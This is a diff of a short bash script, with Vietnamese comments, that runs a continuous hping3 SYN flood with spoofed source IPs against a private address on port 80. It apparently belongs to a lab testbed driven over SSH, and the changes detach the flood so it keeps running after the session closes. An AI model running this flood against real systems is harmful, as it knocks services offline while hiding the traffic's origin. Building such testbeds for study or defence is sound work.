@@ -1,5 +1,5 @@
 #!/bin/bash
-set -euo pipefail
+# set -euo pipefail  # Bỏ: gây crash khi chạy qua SSH non-TTY (ip netns exec không có terminal)
 
 TARGET="10.10.2.2"
 PORT=80
@@ -32,9 +32,12 @@ print(random.choice(list(net.hosts())))
 echo "[*] Source IP giả lập: $SPOOF_IP"
 echo "[*] Target: $TARGET:$PORT | Đang flood liên tục... (Ctrl+C để dừng)"
 
-# 🚀 Chạy flood liên tục
-sudo hping3 -S "$TARGET" -p "$PORT" --flood -a "$SPOOF_IP" --quiet &
+# Chạy flood liên tục — bỏ sudo (SSH session đã là root)
+hping3 -S "$TARGET" -p "$PORT" --flood -a "$SPOOF_IP" --quiet &
 HPING_PID=$!
 
-# Giữ script chạy đến khi Ctrl+C
+# Disown để hping3 không bị SIGHUP khi SSH session đóng
+disown $HPING_PID
+
+# Giữ script chạy đến khi Ctrl+C (hoặc pkill từ orchestrator)
 wait $HPING_PID
